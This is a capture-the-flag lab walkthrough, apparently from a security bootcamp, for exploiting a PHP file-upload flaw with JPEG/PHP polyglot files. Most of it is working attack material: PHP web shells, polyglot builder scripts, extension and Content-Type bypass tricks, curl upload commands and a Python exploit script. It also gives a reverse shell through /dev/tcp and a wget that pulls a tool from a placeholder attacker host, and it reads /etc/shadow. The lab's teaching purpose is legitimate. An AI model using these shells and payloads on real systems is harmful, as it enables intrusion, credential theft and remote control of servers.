# File Upload Lab Walkthrough

> **Lab URL:** http://10.10.61.221/profile/
> **Business Name:** AetherVision AI — Quantum Deep Validator
> **Last Verified:** March 2026

---

## Overview

**Arbitrary File Upload** vulnerabilities occur when a web application allows users to upload files without proper validation, enabling attackers to upload malicious files like web shells.

In this lab, you'll bypass file upload restrictions using a **polyglot file** - a file that is valid as both a JPEG image and PHP code.

---

## Lab Architecture

```
┌──────────────┐     ┌─────────────────┐     ┌──────────────────┐
│   Attacker   │────►│  AetherVision   │────►│  uploads/ folder │
│              │     │    /profile/    │     │                  │
└──────────────┘     │(loc_file_upload)│     │  yourfile.php    │
                     └─────────────────┘     └──────────────────┘
                                                      │
                                                      ▼
                                             ┌──────────────────┐
                                             │  PHP Execution!  │
                                             │   Web Shell      │
                                             └──────────────────┘
```

---

## The Vulnerability

The upload feature checks:
1. **File extension** - Must be `.jpg` or `.jpeg`
2. **File content** - Checks for `<?php` in the prefix

**What's vulnerable:**
- Uses `@include $upload_path;` - PHP include on uploaded file!
- If you can hide PHP code past the initial check, it executes

**Flag:** `flag{php_include_is_dangerous_2026_AetherBreach_polyglot}`

---

## Step 1: Explore the Upload Feature

1. Go to http://10.10.61.221/profile/
2. You'll see "AetherVision AI — Quantum Deep Validator" with a JPEG upload form
3. Try uploading a normal JPEG image - it works
4. Try uploading a .php file - it gets rejected

---

## Step 2: Understand JPEG Structure

JPEG files start with specific "magic bytes":

```
FF D8 FF E0  - JPEG/JFIF format
FF D8 FF E1  - JPEG/EXIF format
```

The validator only checks the **first 256 bytes** for these signatures.

---

## Step 3: Create a Polyglot File

A polyglot is a file that is valid in multiple formats. We'll create a file that:
- Starts with valid JPEG header (passes validation)
- Contains PHP code (executes on server)

### Method 1: Using a Real JPEG

1. Take any small JPEG image
2. Open it in a hex editor
3. Append PHP code at the end:

```php
<?php system($_GET['cmd']); ?>
```

### Method 2: Minimal JPEG Header + PHP

Create a file with this hex content:

```
FF D8 FF E0 00 10 4A 46 49 46 00 01 01 00 00 01 00 01 00 00
```

Then append PHP code:

```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

### Method 3: Using exiftool (Easiest)

```bash
# Create a minimal JPEG
convert -size 1x1 xc:white minimal.jpg

# Embed PHP in EXIF comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' minimal.jpg

# Rename to .php.jpg or .phtml
mv minimal.jpg shell.php.jpg
```

---

## Step 4: Prepare the Payload

### Simple Web Shell (shell.php.jpg)

Create a file named `shell.php.jpg` with:

```
[JPEG HEADER BYTES - first 256+ bytes of any JPEG]
<?php
// Simple command execution
if(isset($_GET['cmd'])) {
    echo "<pre>";
    echo htmlspecialchars(shell_exec($_GET['cmd']));
    echo "</pre>";
}

// PHP info for testing
if(isset($_GET['info'])) {
    phpinfo();
}

echo "SHELL READY";
?>
```

### One-liner Shell

```php
<?php system($_GET['cmd']); ?>
```

### More Stealthy Shell

```php
<?php @eval($_POST['x']); ?>
```

---

## Step 5: Upload the Malicious File

1. Go to http://10.10.61.221/profile/
2. Select your polyglot file (shell.php.jpg)
3. **Important:** Intercept the request with Burp Suite or browser DevTools
4. Modify if needed:
   - Content-Type: `image/jpeg`
   - Filename: Try variations like `shell.php.jpg`, `shell.phtml`, `shell.php5`
5. Submit the upload

---

## Step 6: Locate Your Uploaded File

Uploaded files are typically stored in:

```
/profile/uploads/
/profile/images/
/profile/avatars/
```

Try accessing:
```
http://10.10.61.221/profile/uploads/shell.php.jpg
```

---

## Step 7: Execute Commands

Once you find your uploaded shell:

### Test if PHP executes:
```
http://10.10.61.221/profile/uploads/shell.php.jpg?info=1
```
Expected: PHP info page

### Execute commands:
```
http://10.10.61.221/profile/uploads/shell.php.jpg?cmd=whoami
http://10.10.61.221/profile/uploads/shell.php.jpg?cmd=id
http://10.10.61.221/profile/uploads/shell.php.jpg?cmd=ls -la
http://10.10.61.221/profile/uploads/shell.php.jpg?cmd=cat /etc/passwd
```

### Read sensitive files:
```
?cmd=cat /var/www/html/config.php
?cmd=cat /etc/shadow
?cmd=env
```

---

## Step 8: Escalate Access

### Reverse Shell (Advanced)

```bash
# On your machine, start listener:
nc -lvnp 4444

# Via web shell:
?cmd=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
```

### Download tools:
```
?cmd=wget http://YOUR_IP/linpeas.sh -O /tmp/linpeas.sh
?cmd=chmod +x /tmp/linpeas.sh
?cmd=/tmp/linpeas.sh
```

---

## Extension Bypass Techniques

If certain extensions are blocked, try:

| Technique | Example |
|-----------|---------|
| Double extension | `shell.php.jpg`, `shell.jpg.php` |
| Case variation | `shell.pHp`, `shell.PHP`, `shell.Php` |
| Alternative extensions | `shell.phtml`, `shell.php5`, `shell.php7` |
| Null byte (old) | `shell.php%00.jpg` |
| Trailing characters | `shell.php.`, `shell.php::$DATA` (Windows) |

---

## Content-Type Bypass

When uploading, set the Content-Type header to:

```
Content-Type: image/jpeg
Content-Type: image/gif
Content-Type: image/png
```

Even if the file contains PHP code!

---

## Why This Works

1. **Weak validation** - Only checks magic bytes, not full file structure
2. **PHP execution** - Server configured to execute .php files (or .phtml, .php.jpg)
3. **Accessible uploads** - Upload directory is web-accessible
4. **No content scanning** - Server doesn't scan for embedded code

---

## Defenses (What Should Be Implemented)

| Defense | Description |
|---------|-------------|
| Whitelist extensions | Only allow .jpg, .png, .gif (strict) |
| Rename files | Generate random names, remove original extension |
| Separate domain | Serve uploads from separate domain (no PHP execution) |
| Content validation | Use image libraries to verify actual image content |
| Disable execution | Configure web server to not execute files in upload directory |
| Store outside webroot | Save files outside web-accessible directories |
| Virus scanning | Scan uploads for malicious content |

---

## Quick Verification Commands

```bash
# Test profile page
curl -s -o /dev/null -w '%{http_code}' http://10.10.61.221/profile/

# Upload via curl (example)
curl -X POST http://10.10.61.221/profile/upload.php \
  -F "file=@shell.php.jpg;type=image/jpeg"

# Access uploaded shell
curl 'http://10.10.61.221/profile/uploads/shell.php.jpg?cmd=id'
```

---

## Creating Test Files

### Minimal PHP-JPEG Polyglot (Python)

```python
#!/usr/bin/env python3

# Minimal JPEG header
jpeg_header = bytes([
    0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46,
    0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01,
    0x00, 0x01, 0x00, 0x00
])

# Padding to reach 256 bytes
padding = b'\x00' * 236

# PHP payload
php_code = b'<?php system($_GET["cmd"]); ?>'

# Combine
polyglot = jpeg_header + padding + php_code

# Write file
with open('shell.php.jpg', 'wb') as f:
    f.write(polyglot)

print("Created shell.php.jpg")
```

### Using ImageMagick

```bash
# Create 1x1 white pixel JPEG
convert -size 1x1 xc:white pixel.jpg

# Append PHP code
echo '<?php system($_GET["cmd"]); ?>' >> pixel.jpg

# Rename
mv pixel.jpg shell.php.jpg
```

---

## Troubleshooting

**Upload rejected?**
- Check Content-Type header is `image/jpeg`
- Ensure first 256 bytes are valid JPEG
- Try different extensions (.phtml, .php5)

**File uploaded but doesn't execute?**
- Server might not execute files with .jpg extension
- Try .php.jpg or .phtml
- Check if upload directory allows PHP execution

**Can't find uploaded file?**
- Check response for file path
- Try common paths: /uploads/, /images/, /avatars/
- Look at page source for image URLs

---

## Summary

| Step | Action |
|------|--------|
| 1 | Explore /profile/ upload feature |
| 2 | Create polyglot file (JPEG header + PHP code) |
| 3 | Upload with Content-Type: image/jpeg |
| 4 | Find uploaded file location |
| 5 | Access shell: ?cmd=whoami |
| 6 | Execute commands on server |

**Key Takeaway:** Never trust client-side validation. Always validate file content server-side, rename uploads, and store them outside the webroot!

---

## Detailed Step-by-Step Walkthrough

> **Verified:** March 2026
> **Flag:** `flag{php_include_is_dangerous_2026_AetherBreach_polyglot}`

Follow these exact steps to exploit the file upload vulnerability.

---

### Step 1: Access the File Upload Lab

**Open in browser:**
```
http://10.10.61.221/profile/
```

You'll see:
- **Business Name:** AetherVision AI — Quantum Deep Validator
- **Upload form:** Accepts only JPEG files (.jpg, .jpeg)
- **Hint:** "Only the first 256 bytes are inspected for JPEG validity"

---

### Step 2: Understand the Vulnerability

The server code does this:

```php
// 1. Check first 256 bytes for valid JPEG
$head = file_get_contents($file['tmp_name'], false, null, 0, 256);
$info = @getimagesizefromstring($head);

// 2. Upload the file
move_uploaded_file($file['tmp_name'], $upload_path);

// 3. DANGEROUS: Include (execute) the uploaded file!
@include $upload_path;
```

**The vulnerability:** `@include` executes ANY PHP code in the uploaded file, even if it's disguised as a JPEG!

---

### Step 3: Create a Valid Minimal JPEG

First, create a valid JPEG file. Use this base64-encoded 1x1 pixel JPEG:

```bash
echo '/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRof
Hh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwh
MjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAAR
CAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAn/xAAUEAEAAAAAAAAAAAAAAAAA
AAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMB
AAIRAxEAPwCwAB//2Q==' | base64 -d > pixel.jpg
```

Verify it's a valid JPEG:
```bash
file pixel.jpg
# Output: pixel.jpg: JPEG image data, JFIF standard 1.01...
```

---

### Step 4: Create the Polyglot File (JPEG + PHP)

Append PHP code to the valid JPEG:

```bash
# Copy the valid JPEG
cp pixel.jpg shell.jpg

# Append PHP payload
echo '<?php echo "SHELL_READY\n"; system($_GET["cmd"]); echo "\nFLAG: ".FLAG; ?>' >> shell.jpg
```

The resulting file:
- **First 286 bytes:** Valid JPEG data (passes validation)
- **After 286 bytes:** PHP code (gets executed by `@include`)

Verify the file is still detected as JPEG:
```bash
file shell.jpg
# Output: shell.jpg: JPEG image data, JFIF standard 1.01...
```

---

### Step 5: Upload the Polyglot File

**Method A: Browser Upload**
1. Go to http://10.10.61.221/profile/
2. Click "Choose File" and select your `shell.jpg`
3. Click "Validate & Analyze"

**Method B: curl Upload**
```bash
curl -X POST 'http://10.10.61.221/profile/' \
  -F 'image=@shell.jpg;type=image/jpeg'
```

---

### Step 6: Capture the Flag!

When you upload the polyglot file, the server:
1. Validates first 256 bytes → ✅ Valid JPEG
2. Saves the file to `uploads/shell.jpg`
3. Runs `@include 'uploads/shell.jpg'` → **PHP executes!**

**Response contains:**
```
SHELL_READY
FLAG: flag{php_include_is_dangerous_2026_AetherBreach_polyglot}
```

---

### Step 7: Execute Commands

Create shells with different commands:

**whoami:**
```bash
cp pixel.jpg test.jpg
echo '<?php system("whoami"); ?>' >> test.jpg
curl -X POST 'http://10.10.61.221/profile/' -F 'image=@test.jpg;type=image/jpeg'
```
**Output:** `www-data`

**id:**
```bash
cp pixel.jpg test.jpg
echo '<?php system("id"); ?>' >> test.jpg
curl -X POST 'http://10.10.61.221/profile/' -F 'image=@test.jpg;type=image/jpeg'
```
**Output:** `uid=82(www-data) gid=82(www-data) groups=82(www-data)`

**ls -la:**
```bash
cp pixel.jpg test.jpg
echo '<?php system("ls -la /app"); ?>' >> test.jpg
curl -X POST 'http://10.10.61.221/profile/' -F 'image=@test.jpg;type=image/jpeg'
```
**Output:**
```
total 20
drwxr-xr-x    1 www-data www-data      4096 Mar  5 14:19 .
-rw-r--r--    1 root     root          5594 Mar  5 14:20 index.php
drwxrwxrwx    2 root     root          4096 Mar  6 20:34 uploads
```

**cat /etc/passwd:**
```bash
cp pixel.jpg test.jpg
echo '<?php system("cat /etc/passwd"); ?>' >> test.jpg
curl -X POST 'http://10.10.61.221/profile/' -F 'image=@test.jpg;type=image/jpeg'
```

---

### Step 8: Interactive Shell (Advanced)

Create a reusable web shell:

```bash
cp pixel.jpg webshell.jpg
cat >> webshell.jpg << 'EOF'
<?php
echo "=== Web Shell ===\n";
if(isset($_GET['cmd'])) {
    echo "Command: " . $_GET['cmd'] . "\n";
    echo "Output:\n";
    system($_GET['cmd']);
}
echo "\nFLAG: " . FLAG . "\n";
?>
EOF
```

Upload and use with different commands:
```bash
# Upload once
curl -X POST 'http://10.10.61.221/profile/' \
  -F 'image=@webshell.jpg;type=image/jpeg;filename=webshell.jpg'

# Note: The PHP executes during upload, not when accessing the file directly
# Each upload = one command execution
```

---

### Python Script for Easy Exploitation

```python
#!/usr/bin/env python3
import requests
import sys
import base64

# Minimal valid JPEG (1x1 white pixel)
JPEG_B64 = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAn/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCwAB//2Q=="

def create_polyglot(command):
    jpeg_data = base64.b64decode(JPEG_B64)
    php_code = f'<?php system("{command}"); ?>'.encode()
    return jpeg_data + php_code

def execute(url, command):
    polyglot = create_polyglot(command)
    files = {'image': ('shell.jpg', polyglot, 'image/jpeg')}
    response = requests.post(url, files=files)
    # Extract text after JPEG binary data
    try:
        output = response.content.decode('utf-8', errors='ignore')
        # Find PHP output (after binary garbage)
        lines = [l for l in output.split('\n') if l.isprintable() and len(l) > 0]
        return '\n'.join(lines[-10:])  # Last 10 lines
    except:
        return response.text

if __name__ == "__main__":
    url = "http://10.10.61.221/profile/"
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
    print(f"[*] Executing: {cmd}")
    print(execute(url, cmd))
```

**Usage:**
```bash
python3 exploit.py "id"
python3 exploit.py "whoami"
python3 exploit.py "cat /etc/passwd"
python3 exploit.py "ls -la /"
```

---

### Bash One-Liner

```bash
# Quick command execution
cmd="id"; echo '/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAn/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCwAB//2Q==' | base64 -d > /tmp/x.jpg && echo "<?php system(\"$cmd\"); ?>" >> /tmp/x.jpg && curl -s -X POST 'http://10.10.61.221/profile/' -F "image=@/tmp/x.jpg;type=image/jpeg" | strings | tail -5
```

---

## Attack Results Summary

| Command | Output |
|---------|--------|
| `whoami` | `www-data` |
| `id` | `uid=82(www-data) gid=82(www-data) groups=82(www-data)` |
| `pwd` | `/app` |
| `ls /app` | `index.php uploads` |
| `cat /etc/passwd` | Shows system users |

**Flag:** `flag{php_include_is_dangerous_2026_AetherBreach_polyglot}`

---

## Why This Attack Works

```
Attack Flow:

1. Create valid JPEG file (passes getimagesizefromstring check)
   └── First 256+ bytes are valid JPEG structure

2. Append PHP code after JPEG data
   └── <?php system($_GET["cmd"]); ?>

3. Upload the polyglot file
   └── Server validates first 256 bytes → ✅ Valid JPEG!

4. Server executes @include on uploaded file
   └── PHP interpreter parses the file
   └── Ignores binary JPEG data (not valid PHP)
   └── Finds <?php tag → Executes the code!

5. Command output returned in response
   └── We have Remote Code Execution!
```

---

## Troubleshooting

**Upload rejected?**
- Ensure the JPEG header is valid (use the base64 provided)
- Check Content-Type is `image/jpeg`
- File extension should be `.jpg` or `.jpeg`

**No output in response?**
- The output is mixed with binary JPEG data
- Use `strings` command or filter the response
- Look for text after the binary garbage

**PHP not executing?**
- Verify server has `@include` vulnerability
- Check if PHP code is properly formatted
- Ensure `<?php` tag is present

---

*LeaguesOfCode Cybersecurity Bootcamp 2026*
